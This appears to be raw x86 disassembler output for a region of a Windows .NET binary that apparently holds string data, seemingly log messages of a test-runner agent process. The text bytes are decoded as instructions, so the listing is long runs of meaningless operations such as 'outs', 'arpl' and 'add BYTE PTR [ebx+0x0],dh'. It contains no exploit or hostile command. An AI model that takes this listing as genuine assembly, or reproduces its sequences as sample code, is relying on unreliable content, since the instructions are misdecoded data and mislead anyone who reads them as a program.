  403bca:	imul   ebp,DWORD PTR [edi+0x6e],0x6567415f
  403bd1:	outs   dx,BYTE PTR ds:[esi]
  403bd2:	je     0x403c24
  403bd4:	jb     0x403c45
  403bd6:	arpl   WORD PTR [ebp+0x73],sp
  403bd9:	jae    0x403c29
  403bdb:	outs   dx,DWORD PTR ds:[esi]
  403bdc:	je     0x403c31
  403bde:	je     0x403c41
  403be0:	jb     0x403c56
  403be2:	gs add BYTE PTR fs:[edx+0x65],dl
  403be7:	imul   esi,DWORD PTR [bp+di+0x74],0x70497265
  403bef:	arpl   WORD PTR [ebx+0x6c],ax
  403bf2:	imul   esp,DWORD PTR [ebp+0x6e],0x72655374
  403bf9:	jbe    0x403c60
  403bfb:	jb     0x403c40
  403bfd:	push   0x656e6e61
  403c02:	ins    BYTE PTR es:[edi],dx
  403c03:	add    BYTE PTR [ebx+0x68],al
  403c06:	popa   
  403c07:	outs   dx,BYTE PTR ds:[esi]
  403c08:	outs   dx,BYTE PTR ds:[esi]
  403c09:	gs ins BYTE PTR es:[edi],dx
  403c0b:	push   ebx
  403c0c:	gs jb  0x403c85
  403c0f:	imul   esp,DWORD PTR [ebx+0x65],0x43490073
  403c16:	push   0x656e6e61
  403c1b:	ins    BYTE PTR es:[edi],dx
  403c1c:	add    BYTE PTR [ebp+0x6e],dl
  403c1f:	jb     0x403c86
  403c21:	imul   esi,DWORD PTR [bp+di+0x74],0x68437265
  403c29:	popa   
  403c2a:	outs   dx,BYTE PTR ds:[esi]
  403c2b:	outs   dx,BYTE PTR ds:[esi]
  403c2c:	gs ins BYTE PTR es:[edi],dx
  403c2e:	add    BYTE PTR [edi+0x65],ah
  403c31:	je     0x403c92
  403c33:	inc    ebp
  403c34:	js     0x403c9f
  403c36:	je     0x403c7b
  403c38:	outs   dx,DWORD PTR ds:[esi]
  403c39:	fs add BYTE PTR gs:[edi+0x61],dl
  403c3e:	jb     0x403cae
  403c40:	imul   ebp,DWORD PTR [esi+0x67],0x65764500
  403c47:	outs   dx,BYTE PTR ds:[esi]
  403c48:	je     0x403ca1
  403c4a:	popa   
  403c4b:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  403c53:	add    BYTE PTR [ebx+0x65],dl
  403c56:	je     0x403c58
  403c58:	inc    ebx
  403c59:	ins    BYTE PTR es:[edi],dx
  403c5a:	gs popa 
  403c5c:	outs   dx,BYTE PTR ds:[esi]
  403c5d:	jne    0x403ccf
  403c5f:	add    BYTE PTR [eax],al
  403c61:	dec    ecx
  403c62:	push   ebx
  403c63:	add    BYTE PTR [edi+0x0],ch
  403c66:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  403c6b:	add    BYTE PTR [ecx+0x0],ah
  403c6e:	jb     0x403c70
  403c70:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  403c75:	add    BYTE PTR [ecx+0x0],ch
  403c78:	arpl   WORD PTR [eax],ax
  403c7a:	jb     0x403c7c
  403c7c:	outs   dx,DWORD PTR ds:[esi]
  403c7d:	add    BYTE PTR [ebx+0x0],dh
  403c80:	outs   dx,DWORD PTR ds:[esi]
  403c81:	add    BYTE PTR [esi+0x0],ah
  403c84:	je     0x403c86
  403c86:	pop    esp
  403c87:	add    BYTE PTR [esi+0x0],dl
  403c8a:	imul   eax,DWORD PTR [eax],0x750073
  403c90:	popa   
  403c91:	add    BYTE PTR [eax+eax*1+0x53],ch
  403c95:	add    BYTE PTR [eax+eax*1+0x75],dh
  403c99:	add    BYTE PTR [eax+eax*1+0x69],ah
  403c9d:	add    BYTE PTR [edi+0x0],ch
  403ca0:	pop    esp
  403ca1:	add    BYTE PTR [ecx],dh
  403ca3:	add    BYTE PTR [ecx],dh
  403ca5:	add    BYTE PTR [esi],ch
  403ca7:	add    BYTE PTR [eax],dh
  403ca9:	add    BYTE PTR [eax],al
  403cab:	or     DWORD PTR [esi],ebp
  403cad:	add    BYTE PTR [ebp+0x0],ah
  403cb0:	js     0x403cb2
  403cb2:	add    BYTE PTR gs:[eax],al
  403cb5:	and    DWORD PTR [esi+0x0],edx
  403cb8:	push   ebx
  403cb9:	add    BYTE PTR [eax+eax*1+0x54],dl
  403cbd:	add    BYTE PTR [ecx+0x0],al
  403cc0:	add    BYTE PTR [di+0x0],ah
  403cc4:	outs   dx,BYTE PTR ds:[esi]
  403cc5:	add    BYTE PTR [eax+eax*1+0x50],dh
  403cc9:	add    BYTE PTR [edx+0x0],dh
  403ccc:	outs   dx,DWORD PTR ds:[esi]
  403ccd:	add    BYTE PTR [ebx+0x0],ah
  403cd0:	add    BYTE PTR gs:[ebx+0x0],dh
  403cd4:	jae    0x403cd6
  403cd6:	add    BYTE PTR [ecx],ch
  403cd8:	push   esi
  403cd9:	add    BYTE PTR [ebx+0x0],dl
  403cdc:	push   esp
  403cdd:	add    BYTE PTR [eax+eax*1+0x41],dl
  403ce1:	add    BYTE PTR [edi+0x0],ah
  403ce4:	add    BYTE PTR gs:[esi+0x0],ch
  403ce8:	je     0x403cea
  403cea:	push   eax
  403ceb:	add    BYTE PTR [edx+0x0],dh
  403cee:	outs   dx,DWORD PTR ds:[esi]
  403cef:	add    BYTE PTR [ebx+0x0],ah
  403cf2:	add    BYTE PTR gs:[ebx+0x0],dh
  403cf6:	jae    0x403cf8
  403cf8:	add    BYTE PTR cs:[eax+eax*1+0x6f],ch
  403cfd:	add    BYTE PTR [edi+0x0],ah
  403d00:	add    BYTE PTR ds:0x670041,ch
  403d06:	add    BYTE PTR gs:[esi+0x0],ch
  403d0a:	je     0x403d0c
  403d0c:	push   eax
  403d0d:	add    BYTE PTR [edx+0x0],dh
  403d10:	outs   dx,DWORD PTR ds:[esi]
  403d11:	add    BYTE PTR [ebx+0x0],ah
  403d14:	add    BYTE PTR gs:[ebx+0x0],dh
  403d18:	jae    0x403d1a
  403d1a:	cmp    al,BYTE PTR [eax]
  403d1c:	and    BYTE PTR [eax],al
  403d1e:	jae    0x403d20
  403d20:	je     0x403d22
  403d22:	popa   
  403d23:	add    BYTE PTR [edx+0x0],dh
  403d26:	je     0x403d28
  403d28:	imul   eax,DWORD PTR [eax],0x67006e
  403d2e:	add    BYTE PTR [ebx],dl
  403d30:	das    
  403d31:	add    BYTE PTR [ecx+0x0],ah
  403d34:	add    BYTE PTR [di+0x0],ah
  403d38:	outs   dx,BYTE PTR ds:[esi]
  403d39:	add    BYTE PTR [eax+eax*1+0x4b],dh
  403d3d:	add    BYTE PTR [ebp+0x0],ah
  403d40:	jns    0x403d42
  403d42:	add    BYTE PTR ds:0x68002f,bl
  403d48:	outs   dx,DWORD PTR ds:[esi]
  403d49:	add    BYTE PTR [ebx+0x0],dh
  403d4c:	je     0x403d4e
  403d4e:	push   eax
  403d4f:	add    BYTE PTR [edx+0x0],dh
  403d52:	outs   dx,DWORD PTR ds:[esi]
  403d53:	add    BYTE PTR [ebx+0x0],ah
  403d56:	add    BYTE PTR gs:[ebx+0x0],dh
  403d5a:	jae    0x403d5c
  403d5c:	dec    ecx
  403d5d:	add    BYTE PTR [eax+eax*1+0x0],ah
  403d61:	and    DWORD PTR [edi],ebp
  403d63:	add    BYTE PTR [eax+0x0],ch
  403d66:	outs   dx,DWORD PTR ds:[esi]
  403d67:	add    BYTE PTR [ebx+0x0],dh
  403d6a:	je     0x403d6c
  403d6c:	dec    ecx
  403d6d:	add    BYTE PTR [eax+0x0],dh
  403d70:	arpl   WORD PTR [eax],ax
  403d72:	push   eax
  403d73:	add    BYTE PTR [edi+0x0],ch
  403d76:	jb     0x403d78
  403d78:	je     0x403d7a
  403d7a:	dec    esi
  403d7b:	add    BYTE PTR [ecx+0x0],ah
  403d7e:	ins    DWORD PTR es:[edi],dx
  403d7f:	add    BYTE PTR [ebp+0x0],ah
  403d82:	add    BYTE PTR [ebx+0x41],ah
  403d85:	add    BYTE PTR [edi+0x0],ah
  403d88:	add    BYTE PTR gs:[esi+0x0],ch
  403d8c:	je     0x403d8e
  403d8e:	push   eax
  403d8f:	add    BYTE PTR [edx+0x0],dh
  403d92:	outs   dx,DWORD PTR ds:[esi]
  403d93:	add    BYTE PTR [ebx+0x0],ah
  403d96:	add    BYTE PTR gs:[ebx+0x0],dh
  403d9a:	jae    0x403d9c
  403d9c:	cmp    al,BYTE PTR [eax]
  403d9e:	and    BYTE PTR [eax],al
  403da0:	inc    ebx
  403da1:	add    BYTE PTR [edi+0x0],ch
  403da4:	ins    DWORD PTR es:[edi],dx
  403da5:	add    BYTE PTR [ebp+0x0],ch
  403da8:	popa   
  403da9:	add    BYTE PTR [esi+0x0],ch
  403dac:	add    BYTE PTR fs:[eax],ah
  403daf:	add    BYTE PTR [eax+eax*1+0x69],ch
  403db3:	add    BYTE PTR [esi+0x0],ch
  403db6:	add    BYTE PTR gs:[eax],ah
  403db9:	add    BYTE PTR [ecx+0x0],ah
  403dbc:	jb     0x403dbe
  403dbe:	add    BYTE PTR [di+0x0],dh
  403dc2:	ins    DWORD PTR es:[edi],dx
  403dc3:	add    BYTE PTR [ebp+0x0],ah
  403dc6:	outs   dx,BYTE PTR ds:[esi]
  403dc7:	add    BYTE PTR [eax+eax*1+0x73],dh
  403dcb:	add    BYTE PTR [eax],ah
  403dcd:	add    BYTE PTR [ecx+0x0],ah
  403dd0:	jb     0x403dd2
  403dd2:	add    BYTE PTR gs:[eax],ah
  403dd5:	add    BYTE PTR [ecx+0x0],ch
  403dd8:	outs   dx,BYTE PTR ds:[esi]
  403dd9:	add    BYTE PTR [esi+0x0],dh
  403ddc:	popa   
  403ddd:	add    BYTE PTR [eax+eax*1+0x69],ch
  403de1:	add    BYTE PTR [eax+eax*1+0x2e],ah
  403de5:	add    BYTE PTR [eax],al
  403de7:	sbb    BYTE PTR [ecx+0x610044],0x74
  403dee:	add    BYTE PTR [ecx+0x0],ah
  403df1:	inc    ebx
  403df2:	add    BYTE PTR [edi+0x0],ch
  403df5:	ins    BYTE PTR es:[edi],dx
  403df6:	add    BYTE PTR [eax+eax*1+0x65],ch
  403dfa:	add    BYTE PTR [ebx+0x0],ah
  403dfd:	je     0x403dff
  403dff:	imul   eax,DWORD PTR [eax],0x6e006f
  403e05:	inc    ecx
  403e06:	add    BYTE PTR [edi+0x0],ah
  403e09:	add    BYTE PTR gs:[esi+0x0],ch
  403e0d:	je     0x403e0f
  403e0f:	push   eax
  403e10:	add    BYTE PTR [edx+0x0],dh
  403e13:	outs   dx,DWORD PTR ds:[esi]
  403e14:	add    BYTE PTR [ebx+0x0],ah
  403e17:	add    BYTE PTR gs:[ebx+0x0],dh
  403e1b:	jae    0x403e1d
  403e1d:	cmp    al,BYTE PTR [eax]
  403e1f:	and    BYTE PTR [eax],al
  403e21:	push   esp
  403e22:	add    BYTE PTR [eax+0x0],ch
  403e25:	add    BYTE PTR gs:[eax],ah
  403e28:	add    BYTE PTR [ecx+0x0],ah
  403e2b:	add    BYTE PTR [di+0x0],ah
  403e2f:	outs   dx,BYTE PTR ds:[esi]
  403e30:	add    BYTE PTR [eax+eax*1+0x20],dh
  403e34:	add    BYTE PTR [eax+0x0],dh
  403e37:	jb     0x403e39
  403e39:	outs   dx,DWORD PTR ds:[esi]
  403e3a:	add    BYTE PTR [ebx+0x0],ah
  403e3d:	add    BYTE PTR gs:[ebx+0x0],dh
  403e41:	jae    0x403e43
  403e43:	and    BYTE PTR [eax],al
  403e45:	ins    DWORD PTR es:[edi],dx
  403e46:	add    BYTE PTR [ecx+0x0],ah
  403e49:	outs   dx,BYTE PTR ds:[esi]
  403e4a:	add    BYTE PTR [ecx+0x0],ah
  403e4d:	add    BYTE PTR [di+0x0],ah
  403e51:	jb     0x403e53
  403e53:	and    BYTE PTR [eax],al
  403e55:	jo     0x403e57
  403e57:	jb     0x403e59
  403e59:	outs   dx,DWORD PTR ds:[esi]
  403e5a:	add    BYTE PTR [ebx+0x0],ah
  403e5d:	add    BYTE PTR gs:[ebx+0x0],dh
  403e61:	jae    0x403e63
  403e63:	and    BYTE PTR [eax],al
  403e65:	dec    ecx
  403e66:	add    BYTE PTR [eax+eax*1+0x20],al
  403e6a:	add    BYTE PTR [ecx+0x0],ch
  403e6d:	jae    0x403e6f
  403e6f:	and    BYTE PTR [eax],al
  403e71:	imul   eax,DWORD PTR [eax],0x76006e
  403e77:	popa   
  403e78:	add    BYTE PTR [eax+eax*1+0x69],ch
  403e7c:	add    BYTE PTR [eax+eax*1+0x2e],ah
  403e80:	add    BYTE PTR [eax],al
  403e82:	push   edi
  403e83:	inc    ecx
  403e84:	add    BYTE PTR [edi+0x0],ah
  403e87:	add    BYTE PTR gs:[esi+0x0],ch
  403e8b:	je     0x403e8d
  403e8d:	push   eax
  403e8e:	add    BYTE PTR [edx+0x0],dh
  403e91:	outs   dx,DWORD PTR ds:[esi]
  403e92:	add    BYTE PTR [ebx+0x0],ah
  403e95:	add    BYTE PTR gs:[ebx+0x0],dh
  403e99:	jae    0x403e9b
  403e9b:	cmp    al,BYTE PTR [eax]
  403e9d:	and    BYTE PTR [eax],al
  403e9f:	inc    ebx
  403ea0:	add    BYTE PTR [ecx+0x0],ah
  403ea3:	jne    0x403ea5
  403ea5:	add    BYTE PTR [bx+si+0x0],ch
  403ea9:	je     0x403eab
  403eab:	and    BYTE PTR [eax],al
  403ead:	add    BYTE PTR gs:[eax+0x0],bh
  403eb1:	arpl   WORD PTR [eax],ax
  403eb3:	add    BYTE PTR gs:[eax+0x0],dh
  403eb7:	je     0x403eb9
  403eb9:	imul   eax,DWORD PTR [eax],0x6e006f
  403ebf:	and    BYTE PTR [eax],al
  403ec1:	add    BYTE PTR fs:[ebp+0x0],dh
  403ec5:	jb     0x403ec7
  403ec7:	imul   eax,DWORD PTR [eax],0x67006e
  403ecd:	and    BYTE PTR [eax],al
  403ecf:	push   edx
  403ed0:	add    BYTE PTR [ebp+0x0],dh
  403ed3:	outs   dx,BYTE PTR ds:[esi]
  403ed4:	add    BYTE PTR [edx],bh
  403ed6:	add    BYTE PTR [eax],ah
  403ed8:	add    BYTE PTR [eax],al
  403eda:	cmp    DWORD PTR [ecx+0x0],eax
  403edd:	add    BYTE PTR [di+0x0],ah
  403ee1:	outs   dx,BYTE PTR ds:[esi]
  403ee2:	add    BYTE PTR [eax+eax*1+0x50],dh
  403ee6:	add    BYTE PTR [edx+0x0],dh
  403ee9:	outs   dx,DWORD PTR ds:[esi]
  403eea:	add    BYTE PTR [ebx+0x0],ah
  403eed:	add    BYTE PTR gs:[ebx+0x0],dh
  403ef1:	jae    0x403ef3
  403ef3:	cmp    al,BYTE PTR [eax]
  403ef5:	and    BYTE PTR [eax],al
  403ef7:	jae    0x403ef9
  403ef9:	push   0x74007500
  403efe:	add    BYTE PTR [eax+eax*1+0x69],dh
  403f02:	add    BYTE PTR [esi+0x0],ch
  403f05:	add    BYTE PTR [bx+si],ah
  403f08:	add    BYTE PTR [eax+eax*1+0x6f],ah
  403f0c:	add    BYTE PTR [edi+0x0],dh
  403f0f:	outs   dx,BYTE PTR ds:[esi]
  403f10:	add    BYTE PTR [esi],ch
  403f12:	add    BYTE PTR [eax],al
  403f14:	sub    eax,DWORD PTR [ecx+0x0]
  403f17:	add    BYTE PTR [di+0x0],ah
  403f1b:	outs   dx,BYTE PTR ds:[esi]
  403f1c:	add    BYTE PTR [eax+eax*1+0x50],dh
  403f20:	add    BYTE PTR [edx+0x0],dh
  403f23:	outs   dx,DWORD PTR ds:[esi]
  403f24:	add    BYTE PTR [ebx+0x0],ah
  403f27:	add    BYTE PTR gs:[ebx+0x0],dh
  403f2b:	jae    0x403f2d
  403f2d:	cmp    al,BYTE PTR [eax]
  403f2f:	and    BYTE PTR [eax],al
  403f31:	add    BYTE PTR gs:[eax+0x0],bh
  403f35:	imul   eax,DWORD PTR [eax],0x690074
  403f3b:	outs   dx,BYTE PTR ds:[esi]
  403f3c:	add    BYTE PTR [edi+0x0],ah
  403f3f:	add    BYTE PTR [ebp+0x41],ch
  403f42:	add    BYTE PTR [edi+0x0],ah
  403f45:	add    BYTE PTR gs:[esi+0x0],ch
  403f49:	je     0x403f4b
  403f4b:	push   eax
  403f4c:	add    BYTE PTR [edx+0x0],dh
  403f4f:	outs   dx,DWORD PTR ds:[esi]
  403f50:	add    BYTE PTR [ebx+0x0],ah
  403f53:	add    BYTE PTR gs:[ebx+0x0],dh
  403f57:	jae    0x403f59
  403f59:	cmp    al,BYTE PTR [eax]
  403f5b:	inc    ebx
  403f5c:	add    BYTE PTR [ebp+0x0],dh
  403f5f:	jb     0x403f61
  403f61:	jb     0x403f63
  403f63:	add    BYTE PTR gs:[esi+0x0],ch
  403f67:	je     0x403f69
  403f69:	inc    esp
  403f6a:	add    BYTE PTR [edi+0x0],ch
  403f6d:	ins    DWORD PTR es:[edi],dx
  403f6e:	add    BYTE PTR [ecx+0x0],ah
  403f71:	imul   eax,DWORD PTR [eax],0x5f006e
  403f77:	push   ebp
  403f78:	add    BYTE PTR [esi+0x0],ch
  403f7b:	push   0x6e006100
  403f80:	add    BYTE PTR [eax+eax*1+0x6c],ah
  403f84:	add    BYTE PTR [ebp+0x0],ah
  403f87:	add    BYTE PTR fs:[ebp+0x0],al
  403f8b:	js     0x403f8d
  403f8d:	arpl   WORD PTR [eax],ax
  403f8f:	add    BYTE PTR gs:[eax+0x0],dh
  403f93:	je     0x403f95
  403f95:	imul   eax,DWORD PTR [eax],0x6e006f
  403f9b:	cmp    al,BYTE PTR [eax]
  403f9d:	and    BYTE PTR [eax],al
  403f9f:	inc    ebp
  403fa0:	add    BYTE PTR [esi+0x0],ch
  403fa3:	je     0x403fa5
  403fa5:	add    BYTE PTR gs:[edx+0x0],dh
  403fa9:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  403fae:	jns    0x403ff1
  403fb0:	add    BYTE PTR [edi+0x0],ah
  403fb3:	add    BYTE PTR gs:[esi+0x0],ch
  403fb7:	je     0x403fb9
  403fb9:	push   eax
  403fba:	add    BYTE PTR [edx+0x0],dh
  403fbd:	outs   dx,DWORD PTR ds:[esi]
  403fbe:	add    BYTE PTR [ebx+0x0],ah
  403fc1:	add    BYTE PTR gs:[ebx+0x0],dh
  403fc5:	jae    0x403fc7
  403fc7:	cmp    al,BYTE PTR [eax]
  403fc9:	inc    ebx
  403fca:	add    BYTE PTR [ebp+0x0],dh
  403fcd:	jb     0x403fcf
  403fcf:	jb     0x403fd1
  403fd1:	add    BYTE PTR gs:[esi+0x0],ch
  403fd5:	je     0x403fd7
  403fd7:	inc    esp
  403fd8:	add    BYTE PTR [edi+0x0],ch
  403fdb:	ins    DWORD PTR es:[edi],dx
  403fdc:	add    BYTE PTR [ecx+0x0],ah
  403fdf:	imul   eax,DWORD PTR [eax],0x5f006e
  403fe5:	push   ebp
  403fe6:	add    BYTE PTR [esi+0x0],ch
  403fe9:	push   0x6e006100
  403fee:	add    BYTE PTR [eax+eax*1+0x6c],ah
  403ff2:	add    BYTE PTR [ebp+0x0],ah
  403ff5:	add    BYTE PTR fs:[ebp+0x0],al
  403ff9:	js     0x403ffb
  403ffb:	arpl   WORD PTR [eax],ax
  403ffd:	add    BYTE PTR gs:[eax+0x0],dh
  404001:	je     0x404003
  404003:	imul   eax,DWORD PTR [eax],0x6e006f
  404009:	cmp    al,BYTE PTR [eax]
  40400b:	and    BYTE PTR [eax],al
  40400d:	dec    ecx
  40400e:	add    BYTE PTR [ebx+0x0],dh
  404011:	push   esp
  404012:	add    BYTE PTR [ebp+0x0],ah
  404015:	jb     0x404017
  404017:	ins    DWORD PTR es:[edi],dx
  404018:	add    BYTE PTR [ecx+0x0],ch
  40401b:	outs   dx,BYTE PTR ds:[esi]
  40401c:	add    BYTE PTR [ecx+0x0],ah
  40401f:	je     0x404021
  404021:	imul   eax,DWORD PTR [eax],0x67006e
  404027:	add    BYTE PTR [eax+0x67004195],al
  40402d:	add    BYTE PTR [ebp+0x0],ah
  404030:	outs   dx,BYTE PTR ds:[esi]
  404031:	add    BYTE PTR [eax+eax*1+0x50],dh
  404035:	add    BYTE PTR [edx+0x0],dh
  404038:	outs   dx,DWORD PTR ds:[esi]
  404039:	add    BYTE PTR [ebx+0x0],ah
  40403c:	add    BYTE PTR gs:[ebx+0x0],dh
  404040:	jae    0x404042
  404042:	cmp    al,BYTE PTR [eax]
  404044:	inc    ebx
  404045:	add    BYTE PTR [ebp+0x0],dh
  404048:	jb     0x40404a
  40404a:	jb     0x40404c
  40404c:	add    BYTE PTR gs:[esi+0x0],ch
  404050:	je     0x404052
  404052:	inc    esp
  404053:	add    BYTE PTR [edi+0x0],ch
  404056:	ins    DWORD PTR es:[edi],dx
  404057:	add    BYTE PTR [ecx+0x0],ah
  40405a:	imul   eax,DWORD PTR [eax],0x5f006e
  404060:	push   ebp
  404061:	add    BYTE PTR [esi+0x0],ch
  404064:	push   0x6e006100
  404069:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40406d:	add    BYTE PTR [ebp+0x0],ah
  404070:	add    BYTE PTR fs:[ebp+0x0],al
  404074:	js     0x404076
  404076:	arpl   WORD PTR [eax],ax
  404078:	add    BYTE PTR gs:[eax+0x0],dh
  40407c:	je     0x40407e
  40407e:	imul   eax,DWORD PTR [eax],0x6e006f
  404084:	cmp    al,BYTE PTR [eax]
  404086:	and    BYTE PTR [eax],al
  404088:	inc    ebx
  404089:	add    BYTE PTR [ecx+0x0],ah
  40408c:	ins    BYTE PTR es:[edi],dx
  40408d:	add    BYTE PTR [eax+eax*1+0x69],ch
  404091:	add    BYTE PTR [esi+0x0],ch
  404094:	add    BYTE PTR [bx+si],ah
  404097:	add    BYTE PTR [ecx+0x0],al
  40409a:	add    BYTE PTR [di+0x0],ah
  40409e:	outs   dx,BYTE PTR ds:[esi]
  40409f:	add    BYTE PTR [eax+eax*1+0x4f],dh
  4040a3:	add    BYTE PTR [edx+0x0],ah
  4040a6:	push   0x0
  4040a8:	add    BYTE PTR gs:[ebx+0x0],ah
  4040ac:	je     0x4040ae
  4040ae:	add    BYTE PTR cs:[ebx+0x0],al
  4040b2:	ins    BYTE PTR es:[edi],dx
  4040b3:	add    BYTE PTR [ebp+0x0],ah
  4040b6:	popa   
  4040b7:	add    BYTE PTR [esi+0x0],ch
  4040ba:	jne    0x4040bc
  4040bc:	jo     0x4040be
  4040be:	add    BYTE PTR [ebp+0x41],bh
  4040c1:	add    BYTE PTR [edi+0x0],ah
  4040c4:	add    BYTE PTR gs:[esi+0x0],ch
  4040c8:	je     0x4040ca
  4040ca:	push   eax
  4040cb:	add    BYTE PTR [edx+0x0],dh
  4040ce:	outs   dx,DWORD PTR ds:[esi]
  4040cf:	add    BYTE PTR [ebx+0x0],ah
  4040d2:	add    BYTE PTR gs:[ebx+0x0],dh
  4040d6:	jae    0x4040d8
  4040d8:	cmp    al,BYTE PTR [eax]
  4040da:	and    BYTE PTR [eax],al
  4040dc:	inc    ebx
  4040dd:	add    BYTE PTR [ecx+0x0],ah
  4040e0:	ins    BYTE PTR es:[edi],dx
  4040e1:	add    BYTE PTR [eax+eax*1+0x69],ch
  4040e5:	add    BYTE PTR [esi+0x0],ch
  4040e8:	add    BYTE PTR [bx+si],ah
  4040eb:	add    BYTE PTR [ecx+0x0],ch
  4040ee:	outs   dx,BYTE PTR ds:[esi]
  4040ef:	add    BYTE PTR [eax+eax*1+0x6f],dh
  4040f3:	add    BYTE PTR [eax],ah
  4040f5:	add    BYTE PTR [ecx+0x0],al
  4040f8:	add    BYTE PTR [di+0x0],ah
  4040fc:	outs   dx,BYTE PTR ds:[esi]
  4040fd:	add    BYTE PTR [eax+eax*1+0x53],dh
  404101:	add    BYTE PTR [ebp+0x0],ah
  404104:	jb     0x404106
  404106:	jbe    0x404108
  404108:	imul   eax,DWORD PTR [eax],0x650063
  40410e:	and    BYTE PTR [eax],al
  404110:	je     0x404112
  404112:	outs   dx,DWORD PTR ds:[esi]
  404113:	add    BYTE PTR [eax],ah
  404115:	add    BYTE PTR [edx+0x0],dh
  404118:	add    BYTE PTR gs:[edi+0x0],ah
  40411c:	imul   eax,DWORD PTR [eax],0x740073
  404122:	add    BYTE PTR gs:[edx+0x0],dh
  404126:	and    BYTE PTR [eax],al
  404128:	je     0x40412a
  40412a:	push   0x20006500
  40412f:	add    BYTE PTR [ecx+0x0],ah
  404132:	add    BYTE PTR [di+0x0],ah
  404136:	outs   dx,BYTE PTR ds:[esi]
  404137:	add    BYTE PTR [eax+eax*1+0x2e],dh
  40413b:	add    BYTE PTR [eax],al
  40413d:	jae    0x404180
  40413f:	add    BYTE PTR [edi+0x0],ah
  404142:	add    BYTE PTR gs:[esi+0x0],ch
  404146:	je     0x404148
  404148:	push   eax
  404149:	add    BYTE PTR [edx+0x0],dh
  40414c:	outs   dx,DWORD PTR ds:[esi]
  40414d:	add    BYTE PTR [ebx+0x0],ah
  404150:	add    BYTE PTR gs:[ebx+0x0],dh
  404154:	jae    0x404156
  404156:	cmp    al,BYTE PTR [eax]
  404158:	and    BYTE PTR [eax],al
  40415a:	push   ebx
  40415b:	add    BYTE PTR [ebp+0x0],dh
  40415e:	arpl   WORD PTR [eax],ax
  404160:	arpl   WORD PTR [eax],ax
  404162:	add    BYTE PTR gs:[ebx+0x0],dh
  404166:	jae    0x404168
  404168:	data16 add BYTE PTR [ebp+0x0],dh
  40416c:	ins    BYTE PTR es:[edi],dx
  40416d:	add    BYTE PTR [eax+eax*1+0x79],ch
  404171:	add    BYTE PTR [eax],ah
  404173:	add    BYTE PTR [edx+0x0],dh
  404176:	add    BYTE PTR gs:[edi+0x0],ah
  40417a:	imul   eax,DWORD PTR [eax],0x740073
  404180:	add    BYTE PTR gs:[edx+0x0],dh
  404184:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  404189:	add    BYTE PTR [eax+eax*1+0x65],dh
  40418d:	add    BYTE PTR [ebx+0x0],dh
  404190:	je     0x404192
  404192:	and    BYTE PTR [eax],al
  404194:	popa   
  404195:	add    BYTE PTR [edi+0x0],ah
  404198:	add    BYTE PTR gs:[esi+0x0],ch
  40419c:	je     0x40419e
  40419e:	and    BYTE PTR [eax],al
  4041a0:	jo     0x4041a2
  4041a2:	jb     0x4041a4
  4041a4:	outs   dx,DWORD PTR ds:[esi]
  4041a5:	add    BYTE PTR [ebx+0x0],ah
  4041a8:	add    BYTE PTR gs:[ebx+0x0],dh
  4041ac:	jae    0x4041ae
  4041ae:	add    BYTE PTR cs:[eax],al
  4041b1:	imul   eax,DWORD PTR [ecx+0x0],0x67
  4041b5:	add    BYTE PTR [ebp+0x0],ah
  4041b8:	outs   dx,BYTE PTR ds:[esi]
  4041b9:	add    BYTE PTR [eax+eax*1+0x50],dh
  4041bd:	add    BYTE PTR [edx+0x0],dh
  4041c0:	outs   dx,DWORD PTR ds:[esi]
  4041c1:	add    BYTE PTR [ebx+0x0],ah
  4041c4:	add    BYTE PTR gs:[ebx+0x0],dh
  4041c8:	jae    0x4041ca
  4041ca:	cmp    al,BYTE PTR [eax]
  4041cc:	and    BYTE PTR [eax],al
  4041ce:	arpl   WORD PTR [eax],ax
  4041d0:	outs   dx,DWORD PTR ds:[esi]
  4041d1:	add    BYTE PTR [ebp+0x0],dh
  4041d4:	ins    BYTE PTR es:[edi],dx
  4041d5:	add    BYTE PTR [eax+eax*1+0x20],ah
  4041d9:	add    BYTE PTR [esi+0x0],ch
  4041dc:	outs   dx,DWORD PTR ds:[esi]
  4041dd:	add    BYTE PTR [eax+eax*1+0x20],dh
  4041e1:	add    BYTE PTR [edx+0x0],dh
  4041e4:	add    BYTE PTR gs:[edi+0x0],ah
  4041e8:	imul   eax,DWORD PTR [eax],0x740073
  4041ee:	add    BYTE PTR gs:[edx+0x0],dh
  4041f2:	and    BYTE PTR [eax],al
  4041f4:	ja     0x4041f6
  4041f6:	imul   eax,DWORD PTR [eax],0x680074
  4041fc:	and    BYTE PTR [eax],al
  4041fe:	popa   
  4041ff:	add    BYTE PTR [edi+0x0],ah
  404202:	add    BYTE PTR gs:[esi+0x0],ch
  404206:	je     0x404208
  404208:	and    BYTE PTR [eax],al
  40420a:	jae    0x40420c
  40420c:	add    BYTE PTR gs:[edx+0x0],dh
  404210:	jbe    0x404212
  404212:	imul   eax,DWORD PTR [eax],0x650063
  404218:	cmp    al,BYTE PTR [eax]
  40421a:	and    BYTE PTR [eax],al
  40421c:	add    BYTE PTR [ecx+0x41],ah
  40421f:	add    BYTE PTR [edi+0x0],ah
  404222:	add    BYTE PTR gs:[esi+0x0],ch
  404226:	je     0x404228
  404228:	push   eax
  404229:	add    BYTE PTR [edx+0x0],dh
  40422c:	outs   dx,DWORD PTR ds:[esi]
  40422d:	add    BYTE PTR [ebx+0x0],ah
  404230:	add    BYTE PTR gs:[ebx+0x0],dh
  404234:	jae    0x404236
  404236:	cmp    al,BYTE PTR [eax]
  404238:	and    BYTE PTR [eax],al
  40423a:	ja     0x40423c
  40423c:	popa   
  40423d:	add    BYTE PTR [ecx+0x0],ch
  404240:	je     0x404242
  404242:	imul   eax,DWORD PTR [eax],0x67006e
  404248:	and    BYTE PTR [eax],al
  40424a:	data16 add BYTE PTR [edi+0x0],ch
  40424e:	jb     0x404250
  404250:	and    BYTE PTR [eax],al
  404252:	jae    0x404254
  404254:	push   0x74007500
  404259:	add    BYTE PTR [eax+eax*1+0x6f],ah
  40425d:	add    BYTE PTR [edi+0x0],dh
  404260:	outs   dx,BYTE PTR ds:[esi]
  404261:	add    BYTE PTR [eax],ah
  404263:	add    BYTE PTR [esi+0x0],ch
  404266:	outs   dx,DWORD PTR ds:[esi]
  404267:	add    BYTE PTR [eax+eax*1+0x69],dh
  40426b:	add    BYTE PTR [esi+0x0],ah
  40426e:	imul   eax,DWORD PTR [eax],0x610063
  404274:	je     0x404276
